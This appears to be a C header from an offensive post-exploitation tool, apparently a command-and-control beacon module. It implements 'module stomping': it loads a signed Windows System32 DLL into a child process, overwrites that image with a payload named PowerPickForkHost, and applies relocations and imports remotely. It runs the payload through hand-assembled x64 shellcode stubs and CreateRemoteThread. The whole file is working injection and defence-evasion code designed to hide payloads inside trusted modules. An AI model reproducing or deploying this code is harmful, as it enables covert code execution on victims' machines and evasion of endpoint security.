#pragma once
/*
 * Module stomping host load:
 *   LoadLibraryEx(victim, DONT_RESOLVE_DLL_REFERENCES) in the child, then
 *   overwrite that image with PowerPickForkHost (sections/relocs/imports).
 *
 * PE work uses remote Read/Write + remote LoadLibrary/GetProcAddress only —
 * no full SizeOfImage buffer in the agent (that previously AVed the beacon).
 */

#include <winnt.h>

#ifndef DONT_RESOLVE_DLL_REFERENCES
#define DONT_RESOLVE_DLL_REFERENCES 0x00000001
#endif

/* Prefer a large, common signed System32 DLL. */
static const char* PpfStompVictims[] = {
    "C:\\Windows\\System32\\crypt32.dll",
    "C:\\Windows\\System32\\winhttp.dll",
    "C:\\Windows\\System32\\urlmon.dll",
    "C:\\Windows\\System32\\wininet.dll",
    NULL
};

static BOOL PpfStompRemoteWrite(
    HANDLE hProcess,
    LPVOID remote,
    const void* local,
    SIZE_T size)
{
    SIZE_T written = 0;
    return KERNEL32$WriteProcessMemory(
        hProcess, remote, local, size, &written) && written == size;
}

static BOOL PpfStompRemoteRead(
    HANDLE hProcess,
    LPCVOID remote,
    void* local,
    SIZE_T size)
{
    SIZE_T readn = 0;
    return KERNEL32$ReadProcessMemory(
        hProcess, remote, local, size, &readn) && readn == size;
}

static LPVOID PpfStompRemoteAlloc(HANDLE hProcess, SIZE_T size, DWORD protect)
{
    return KERNEL32$VirtualAllocEx(
        hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, protect);
}

/* result = fn(rcx, rdx); store at out. */
static BOOL PpfStompRemoteCall2(
    HANDLE hProcess,
    ULONG_PTR fn,
    ULONG_PTR arg0,
    ULONG_PTR arg1,
    ULONG_PTR* outResult,
    DWORD timeoutMs)
{
    BYTE stub[80];
    SIZE_T n = 0;
    LPVOID remoteOut = NULL;
    LPVOID remoteSc = NULL;
    HANDLE hThread = NULL;
    BOOL ok = FALSE;
    ULONG_PTR result = 0;
    DWORD wait;

    if (outResult) {
        *outResult = 0;
    }

    remoteOut = PpfStompRemoteAlloc(hProcess, sizeof(ULONG_PTR), PAGE_READWRITE);
    remoteSc = PpfStompRemoteAlloc(hProcess, 80, PAGE_EXECUTE_READWRITE);
    if (!remoteOut || !remoteSc) {
        goto done;
    }

    stub[n++] = 0x48; stub[n++] = 0x83; stub[n++] = 0xEC; stub[n++] = 0x28;
    stub[n++] = 0x48; stub[n++] = 0xB9;
    MSVCRT$memcpy(stub + n, &arg0, 8); n += 8;
    stub[n++] = 0x48; stub[n++] = 0xBA;
    MSVCRT$memcpy(stub + n, &arg1, 8); n += 8;
    stub[n++] = 0x48; stub[n++] = 0xB8;
    MSVCRT$memcpy(stub + n, &fn, 8); n += 8;
    stub[n++] = 0xFF; stub[n++] = 0xD0;
    stub[n++] = 0x48; stub[n++] = 0xB9;
    MSVCRT$memcpy(stub + n, &remoteOut, 8); n += 8;
    stub[n++] = 0x48; stub[n++] = 0x89; stub[n++] = 0x01;
    stub[n++] = 0x48; stub[n++] = 0x83; stub[n++] = 0xC4; stub[n++] = 0x28;
    stub[n++] = 0xC3;

    if (!PpfStompRemoteWrite(hProcess, remoteSc, stub, n)) {
        goto done;
    }

    hThread = KERNEL32$CreateRemoteThread(
        hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteSc, NULL, 0, NULL);
    if (!hThread) {
        goto done;
    }
    wait = KERNEL32$WaitForSingleObject(hThread, timeoutMs);
    if (wait != WAIT_OBJECT_0) {
        goto done;
    }
    if (!PpfStompRemoteRead(hProcess, remoteOut, &result, sizeof(result))) {
        goto done;
    }
    if (outResult) {
        *outResult = result;
    }
    ok = TRUE;

done:
    if (hThread) {
        KERNEL32$CloseHandle(hThread);
    }
    if (remoteSc) {
        KERNEL32$VirtualFreeEx(hProcess, remoteSc, 0, MEM_RELEASE);
    }
    if (remoteOut) {
        KERNEL32$VirtualFreeEx(hProcess, remoteOut, 0, MEM_RELEASE);
    }
    return ok;
}

static BOOL PpfStompRemoteLoadLibraryExA(
    HANDLE hProcess,
    const char* path,
    DWORD flags,
    ULONG_PTR* outBase)
{
    SIZE_T pathLen;
    LPVOID remotePath = NULL;
    ULONG_PTR pLoadLibraryExA;
    BOOL ok = FALSE;

    *outBase = 0;
    pLoadLibraryExA = (ULONG_PTR)KERNEL32$GetProcAddress(
        KERNEL32$GetModuleHandleA("kernel32.dll"),
        "LoadLibraryExA");
    if (!pLoadLibraryExA) {
        return FALSE;
    }

    pathLen = MSVCRT$strlen(path) + 1;
    remotePath = PpfStompRemoteAlloc(hProcess, pathLen, PAGE_READWRITE);
    if (!remotePath || !PpfStompRemoteWrite(hProcess, remotePath, path, pathLen)) {
        goto done;
    }

    /*
     * LoadLibraryExA(lpLibFileName, hFile, dwFlags)
     * rcx=path, rdx=NULL, r8=flags — need a 3-arg stub.
     */
    {
        BYTE stub[96];
        SIZE_T n = 0;
        LPVOID remoteOut = NULL;
        LPVOID remoteSc = NULL;
        HANDLE hThread = NULL;
        ULONG_PTR result = 0;
        DWORD wait;
        ULONG_PTR zero = 0;
        ULONG_PTR fl = (ULONG_PTR)flags;

        remoteOut = PpfStompRemoteAlloc(hProcess, sizeof(ULONG_PTR), PAGE_READWRITE);
        remoteSc = PpfStompRemoteAlloc(hProcess, 96, PAGE_EXECUTE_READWRITE);
        if (!remoteOut || !remoteSc) {
            goto done3;
        }

        stub[n++] = 0x48; stub[n++] = 0x83; stub[n++] = 0xEC; stub[n++] = 0x28;
        stub[n++] = 0x48; stub[n++] = 0xB9;
        MSVCRT$memcpy(stub + n, &remotePath, 8); n += 8;
        stub[n++] = 0x48; stub[n++] = 0xBA;
        MSVCRT$memcpy(stub + n, &zero, 8); n += 8;
        stub[n++] = 0x49; stub[n++] = 0xB8;
        MSVCRT$memcpy(stub + n, &fl, 8); n += 8;
        stub[n++] = 0x48; stub[n++] = 0xB8;
        MSVCRT$memcpy(stub + n, &pLoadLibraryExA, 8); n += 8;
        stub[n++] = 0xFF; stub[n++] = 0xD0;
        stub[n++] = 0x48; stub[n++] = 0xB9;
        MSVCRT$memcpy(stub + n, &remoteOut, 8); n += 8;
        stub[n++] = 0x48; stub[n++] = 0x89; stub[n++] = 0x01;
        stub[n++] = 0x48; stub[n++] = 0x83; stub[n++] = 0xC4; stub[n++] = 0x28;
        stub[n++] = 0xC3;

        if (!PpfStompRemoteWrite(hProcess, remoteSc, stub, n)) {
            goto done3;
        }
        hThread = KERNEL32$CreateRemoteThread(
            hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteSc, NULL, 0, NULL);
        if (!hThread) {
            goto done3;
        }
        wait = KERNEL32$WaitForSingleObject(hThread, 15000);
        if (wait == WAIT_OBJECT_0 &&
            PpfStompRemoteRead(hProcess, remoteOut, &result, sizeof(result)) &&
            result != 0) {
            *outBase = result;
            ok = TRUE;
        }
        KERNEL32$CloseHandle(hThread);
    done3:
        if (remoteSc) {
            KERNEL32$VirtualFreeEx(hProcess, remoteSc, 0, MEM_RELEASE);
        }
        if (remoteOut) {
            KERNEL32$VirtualFreeEx(hProcess, remoteOut, 0, MEM_RELEASE);
        }
    }

done:
    if (remotePath) {
        KERNEL32$VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
    }
    return ok;
}

static BOOL PpfStompRemoteGetProc(
    HANDLE hProcess,
    ULONG_PTR moduleBase,
    const char* name,
    ULONG_PTR* outFn)
{
    SIZE_T nameLen;
    LPVOID remoteName = NULL;
    ULONG_PTR pGetProcAddress;
    BOOL ok = FALSE;

    *outFn = 0;
    pGetProcAddress = (ULONG_PTR)KERNEL32$GetProcAddress(
        KERNEL32$GetModuleHandleA("kernel32.dll"),
        "GetProcAddress");
    if (!pGetProcAddress) {
        return FALSE;
    }

    nameLen = MSVCRT$strlen(name) + 1;
    remoteName = PpfStompRemoteAlloc(hProcess, nameLen, PAGE_READWRITE);
    if (!remoteName || !PpfStompRemoteWrite(hProcess, remoteName, name, nameLen)) {
        goto done;
    }
    if (!PpfStompRemoteCall2(
            hProcess, pGetProcAddress, moduleBase, (ULONG_PTR)remoteName, outFn,
            15000) ||
        *outFn == 0) {
        goto done;
    }
    ok = TRUE;

done:
    if (remoteName) {
        KERNEL32$VirtualFreeEx(hProcess, remoteName, 0, MEM_RELEASE);
    }
    return ok;
}

static DWORD PpfStompRvaToOffset(const BYTE* pe, DWORD peLen, DWORD rva)
{
    IMAGE_DOS_HEADER* dos;
    IMAGE_NT_HEADERS64* nt;
    IMAGE_SECTION_HEADER* sec;
    WORD i;

    if (!pe || peLen < 0x200) {
        return 0;
    }
    dos = (IMAGE_DOS_HEADER*)pe;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE ||
        (DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > peLen) {
        return 0;
    }
    nt = (IMAGE_NT_HEADERS64*)(pe + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return 0;
    }
    if (rva < nt->OptionalHeader.SizeOfHeaders) {
        return rva;
    }
    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD va = sec[i].VirtualAddress;
        DWORD vsz = sec[i].Misc.VirtualSize;
        DWORD raw = sec[i].PointerToRawData;
        DWORD rsz = sec[i].SizeOfRawData;
        if (rva >= va && rva < va + (vsz ? vsz : rsz)) {
            DWORD off = raw + (rva - va);
            return (off < peLen) ? off : 0;
        }
    }
    return 0;
}

static ULONG_PTR PpfStompGetExportRva(
    const BYTE* pe,
    DWORD peLen,
    const char* exportName)
{
    IMAGE_NT_HEADERS64* nt;
    IMAGE_DATA_DIRECTORY* dir;
    IMAGE_EXPORT_DIRECTORY* exp;
    DWORD* names;
    WORD* ords;
    DWORD* funcs;
    DWORD i;
    DWORD off;

    if (!pe || peLen < 0x200) {
        return 0;
    }
    nt = (IMAGE_NT_HEADERS64*)(pe + ((IMAGE_DOS_HEADER*)pe)->e_lfanew);
    dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir->VirtualAddress) {
        return 0;
    }
    off = PpfStompRvaToOffset(pe, peLen, dir->VirtualAddress);
    if (!off) {
        return 0;
    }
    exp = (IMAGE_EXPORT_DIRECTORY*)(pe + off);
    names = (DWORD*)(pe + PpfStompRvaToOffset(pe, peLen, exp->AddressOfNames));
    ords = (WORD*)(pe + PpfStompRvaToOffset(pe, peLen, exp->AddressOfNameOrdinals));
    funcs = (DWORD*)(pe + PpfStompRvaToOffset(pe, peLen, exp->AddressOfFunctions));
    for (i = 0; i < exp->NumberOfNames; i++) {
        DWORD nameOff = PpfStompRvaToOffset(pe, peLen, names[i]);
        if (!nameOff) {
            continue;
        }
        if (MSVCRT$strncmp((const char*)(pe + nameOff), exportName, 64) == 0) {
            return (ULONG_PTR)funcs[ords[i]];
        }
    }
    return 0;
}

static BOOL PpfStompRemoteCall4(
    HANDLE hProcess,
    ULONG_PTR fn,
    ULONG_PTR a0,
    ULONG_PTR a1,
    ULONG_PTR a2,
    ULONG_PTR a3,
    DWORD waitMs)
{
    BYTE stub[80];
    SIZE_T n = 0;
    LPVOID remoteSc = NULL;
    HANDLE hThread = NULL;
    BOOL ok = FALSE;

    remoteSc = PpfStompRemoteAlloc(hProcess, 80, PAGE_EXECUTE_READWRITE);
    if (!remoteSc) {
        return FALSE;
    }

    stub[n++] = 0x48; stub[n++] = 0x83; stub[n++] = 0xEC; stub[n++] = 0x28;
    stub[n++] = 0x48; stub[n++] = 0xB9;
    MSVCRT$memcpy(stub + n, &a0, 8); n += 8;
    stub[n++] = 0x48; stub[n++] = 0xBA;
    MSVCRT$memcpy(stub + n, &a1, 8); n += 8;
    stub[n++] = 0x49; stub[n++] = 0xB8;
    MSVCRT$memcpy(stub + n, &a2, 8); n += 8;
    stub[n++] = 0x49; stub[n++] = 0xB9;
    MSVCRT$memcpy(stub + n, &a3, 8); n += 8;
    stub[n++] = 0x48; stub[n++] = 0xB8;
    MSVCRT$memcpy(stub + n, &fn, 8); n += 8;
    stub[n++] = 0xFF; stub[n++] = 0xD0;
    stub[n++] = 0x48; stub[n++] = 0x83; stub[n++] = 0xC4; stub[n++] = 0x28;
    stub[n++] = 0xC3;

    if (!PpfStompRemoteWrite(hProcess, remoteSc, stub, n)) {
        goto done;
    }

    hThread = KERNEL32$CreateRemoteThread(
        hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteSc, NULL, 0, NULL);
    if (!hThread) {
        goto done;
    }
    if (waitMs == 0) {
        ok = TRUE;
        goto done;
    }
    ok = (KERNEL32$WaitForSingleObject(hThread, waitMs) == WAIT_OBJECT_0);

done:
    if (hThread) {
        KERNEL32$CloseHandle(hThread);
    }
    if (waitMs != 0 && remoteSc) {
        KERNEL32$VirtualFreeEx(hProcess, remoteSc, 0, MEM_RELEASE);
    }
    return ok;
}

static BOOL PpfStompApplyRelocs(
    HANDLE hProcess,
    ULONG_PTR remoteBase,
    ULONG_PTR preferred,
    const BYTE* pe,
    DWORD peLen,
    DWORD sizeOfImage)
{
    IMAGE_NT_HEADERS64* nt =
        (IMAGE_NT_HEADERS64*)(pe + ((IMAGE_DOS_HEADER*)pe)->e_lfanew);
    IMAGE_DATA_DIRECTORY* dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    DWORD off;
    DWORD processed = 0;
    ULONG_PTR delta;

    if (!dir->VirtualAddress || !dir->Size) {
        return TRUE;
    }
    delta = remoteBase - preferred;
    if (delta == 0) {
        return TRUE;
    }

    off = PpfStompRvaToOffset(pe, peLen, dir->VirtualAddress);
    if (!off) {
        return FALSE;
    }

    while (processed < dir->Size) {
        IMAGE_BASE_RELOCATION* block =
            (IMAGE_BASE_RELOCATION*)(pe + off + processed);
        DWORD count;
        WORD* entries;
        DWORD i;

        if (block->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION)) {
            break;
        }
        count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        entries = (WORD*)((BYTE*)block + sizeof(IMAGE_BASE_RELOCATION));

        for (i = 0; i < count; i++) {
            WORD type = entries[i] >> 12;
            WORD roff = entries[i] & 0xFFF;
            DWORD rva = block->VirtualAddress + roff;
            ULONG_PTR patchAddr;
            ULONG_PTR value;

            if (type == IMAGE_REL_BASED_ABSOLUTE) {
                continue;
            }
            if (type != IMAGE_REL_BASED_DIR64) {
                continue;
            }
            if (rva + sizeof(ULONG_PTR) > sizeOfImage) {
                return FALSE;
            }
            patchAddr = remoteBase + rva;
            if (!PpfStompRemoteRead(
                    hProcess, (LPCVOID)patchAddr, &value, sizeof(value))) {
                return FALSE;
            }
            value += delta;
            if (!PpfStompRemoteWrite(
                    hProcess, (LPVOID)patchAddr, &value, sizeof(value))) {
                return FALSE;
            }
        }
        processed += block->SizeOfBlock;
    }
    return TRUE;
}

static BOOL PpfStompResolveImports(
    HANDLE hProcess,
    ULONG_PTR remoteBase,
    const BYTE* pe,
    DWORD peLen)
{
    IMAGE_NT_HEADERS64* nt =
        (IMAGE_NT_HEADERS64*)(pe + ((IMAGE_DOS_HEADER*)pe)->e_lfanew);
    IMAGE_DATA_DIRECTORY* dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    DWORD descOff;
    DWORD descIndex;

    if (!dir->VirtualAddress) {
        return TRUE;
    }
    descOff = PpfStompRvaToOffset(pe, peLen, dir->VirtualAddress);
    if (!descOff) {
        return FALSE;
    }

    for (descIndex = 0;; descIndex++) {
        IMAGE_IMPORT_DESCRIPTOR imp;
        DWORD nameOff;
        char dllName[128];
        ULONG_PTR remoteMod = 0;
        ULONG_PTR pLoadLibraryA;
        DWORD oftRva;
        DWORD ftRva;
        DWORD thunkIndex;
        SIZE_T dllLen;
        LPVOID remoteDllName = NULL;

        MSVCRT$memcpy(
            &imp,
            pe + descOff + descIndex * sizeof(IMAGE_IMPORT_DESCRIPTOR),
            sizeof(imp));
        if (!imp.Name) {
            break;
        }

        nameOff = PpfStompRvaToOffset(pe, peLen, imp.Name);
        if (!nameOff) {
            return FALSE;
        }
        MSVCRT$memset(dllName, 0, sizeof(dllName));
        {
            DWORD k;
            for (k = 0; k < sizeof(dllName) - 1; k++) {
                if (nameOff + k >= peLen) {
                    break;
                }
                dllName[k] = (char)pe[nameOff + k];
                if (dllName[k] == '\0') {
                    break;
                }
            }
        }

        pLoadLibraryA = (ULONG_PTR)KERNEL32$GetProcAddress(
            KERNEL32$GetModuleHandleA("kernel32.dll"),
            "LoadLibraryA");
        dllLen = MSVCRT$strlen(dllName) + 1;
        remoteDllName = PpfStompRemoteAlloc(hProcess, dllLen, PAGE_READWRITE);
        if (!remoteDllName ||
            !PpfStompRemoteWrite(hProcess, remoteDllName, dllName, dllLen) ||
            !PpfStompRemoteCall2(
                hProcess,
                pLoadLibraryA,
                (ULONG_PTR)remoteDllName,
                0,
                &remoteMod,
                15000) ||
            remoteMod == 0) {
            if (remoteDllName) {
                KERNEL32$VirtualFreeEx(hProcess, remoteDllName, 0, MEM_RELEASE);
            }
            return FALSE;
        }
        KERNEL32$VirtualFreeEx(hProcess, remoteDllName, 0, MEM_RELEASE);

        oftRva = imp.OriginalFirstThunk ? imp.OriginalFirstThunk : imp.FirstThunk;
        ftRva = imp.FirstThunk;

        for (thunkIndex = 0;; thunkIndex++) {
            DWORD entryOff;
            ULONG_PTR entry;
            ULONG_PTR fn = 0;
            ULONG_PTR iatAddr;

            entryOff = PpfStompRvaToOffset(
                pe, peLen, oftRva + thunkIndex * sizeof(ULONG_PTR));
            if (!entryOff) {
                return FALSE;
            }
            entry = *(ULONG_PTR*)(pe + entryOff);
            if (entry == 0) {
                break;
            }

            if (IMAGE_SNAP_BY_ORDINAL64(entry)) {
                return FALSE;
            } else {
                DWORD ibnOff = PpfStompRvaToOffset(pe, peLen, (DWORD)entry);
                IMAGE_IMPORT_BY_NAME* ibn;
                if (!ibnOff || ibnOff + 2 >= peLen) {
                    return FALSE;
                }
                ibn = (IMAGE_IMPORT_BY_NAME*)(pe + ibnOff);
                if (!PpfStompRemoteGetProc(
                        hProcess, remoteMod, (const char*)ibn->Name, &fn)) {
                    return FALSE;
                }
            }

            iatAddr = remoteBase + ftRva + thunkIndex * sizeof(ULONG_PTR);
            if (!PpfStompRemoteWrite(hProcess, (LPVOID)iatAddr, &fn, sizeof(fn))) {
                return FALSE;
            }
        }
    }
    return TRUE;
}

static BOOL PpfStompHostDll(
    HANDLE hProcess,
    const char* hostDll,
    int hostDllLen,
    const char* mapName)
{
    IMAGE_DOS_HEADER* dos;
    IMAGE_NT_HEADERS64* nt;
    DWORD sizeOfImage;
    DWORD sizeOfHeaders;
    ULONG_PTR remoteBase = 0;
    ULONG_PTR exportRva;
    ULONG_PTR entry;
    LPVOID remoteMapName = NULL;
    SIZE_T mapNameLen;
    DWORD oldProt = 0;
    WORD secIndex;
    int v;

    if (!hProcess || !hostDll || hostDllLen < 0x200 || !mapName) {
        return FALSE;
    }

    dos = (IMAGE_DOS_HEADER*)hostDll;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }
    nt = (IMAGE_NT_HEADERS64*)(hostDll + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE ||
        nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        return FALSE;
    }

    sizeOfImage = nt->OptionalHeader.SizeOfImage;
    sizeOfHeaders = nt->OptionalHeader.SizeOfHeaders;
    if (sizeOfHeaders > (DWORD)hostDllLen || sizeOfImage < sizeOfHeaders) {
        return FALSE;
    }

    /* Load a signed victim image (no DllMain / no victim imports). */
    for (v = 0; PpfStompVictims[v] != NULL; v++) {
        if (PpfStompRemoteLoadLibraryExA(
                hProcess,
                PpfStompVictims[v],
                DONT_RESOLVE_DLL_REFERENCES,
                &remoteBase)) {
            break;
        }
        remoteBase = 0;
    }
    if (!remoteBase) {
        return FALSE;
    }

    /* Ensure victim mapping is large enough (read remote SizeOfImage). */
    {
        BYTE hdr[0x200];
        IMAGE_NT_HEADERS64* remoteNt;
        DWORD remoteSize;
        if (!PpfStompRemoteRead(hProcess, (LPCVOID)remoteBase, hdr, sizeof(hdr))) {
            return FALSE;
        }
        remoteNt =
            (IMAGE_NT_HEADERS64*)(hdr + ((IMAGE_DOS_HEADER*)hdr)->e_lfanew);
        remoteSize = remoteNt->OptionalHeader.SizeOfImage;
        if (remoteSize < sizeOfImage) {
            return FALSE;
        }
    }

    if (!KERNEL32$VirtualProtectEx(
            hProcess,
            (LPVOID)remoteBase,
            sizeOfImage,
            PAGE_EXECUTE_READWRITE,
            &oldProt)) {
        return FALSE;
    }

    /* Write our headers + sections over the victim. */
    if (!PpfStompRemoteWrite(
            hProcess, (LPVOID)remoteBase, hostDll, sizeOfHeaders)) {
        return FALSE;
    }

    {
        IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
        for (secIndex = 0; secIndex < nt->FileHeader.NumberOfSections;
             secIndex++) {
            if (sec[secIndex].SizeOfRawData == 0) {
                continue;
            }
            if (sec[secIndex].PointerToRawData + sec[secIndex].SizeOfRawData >
                (DWORD)hostDllLen) {
                return FALSE;
            }
            if (sec[secIndex].VirtualAddress + sec[secIndex].SizeOfRawData >
                sizeOfImage) {
                return FALSE;
            }
            if (!PpfStompRemoteWrite(
                    hProcess,
                    (LPVOID)(remoteBase + sec[secIndex].VirtualAddress),
                    hostDll + sec[secIndex].PointerToRawData,
                    sec[secIndex].SizeOfRawData)) {
                return FALSE;
            }
        }
    }

    if (!PpfStompApplyRelocs(
            hProcess,
            remoteBase,
            (ULONG_PTR)nt->OptionalHeader.ImageBase,
            (const BYTE*)hostDll,
            (DWORD)hostDllLen,
            sizeOfImage)) {
        return FALSE;
    }

    if (!PpfStompResolveImports(
            hProcess, remoteBase, (const BYTE*)hostDll, (DWORD)hostDllLen)) {
        return FALSE;
    }

    exportRva = PpfStompGetExportRva(
        (const BYTE*)hostDll, (DWORD)hostDllLen, "PowerPickForkRun");
    if (!exportRva) {
        return FALSE;
    }
    entry = remoteBase + exportRva;

    /* CRT/DllMain attach (no host work in DllMain). */
    if (nt->OptionalHeader.AddressOfEntryPoint) {
        if (!PpfStompRemoteCall4(
                hProcess,
                remoteBase + nt->OptionalHeader.AddressOfEntryPoint,
                remoteBase,
                1,
                0,
                0,
                15000)) {
            return FALSE;
        }
    }

    mapNameLen = MSVCRT$strlen(mapName) + 1;
    remoteMapName = PpfStompRemoteAlloc(hProcess, mapNameLen, PAGE_READWRITE);
    if (!remoteMapName ||
        !PpfStompRemoteWrite(hProcess, remoteMapName, mapName, mapNameLen)) {
        return FALSE;
    }

    /* Fire-and-forget — export ExitProcess's when done. */
    return PpfStompRemoteCall4(
        hProcess, entry, 0, remoteBase, (ULONG_PTR)remoteMapName, 0, 0);
}
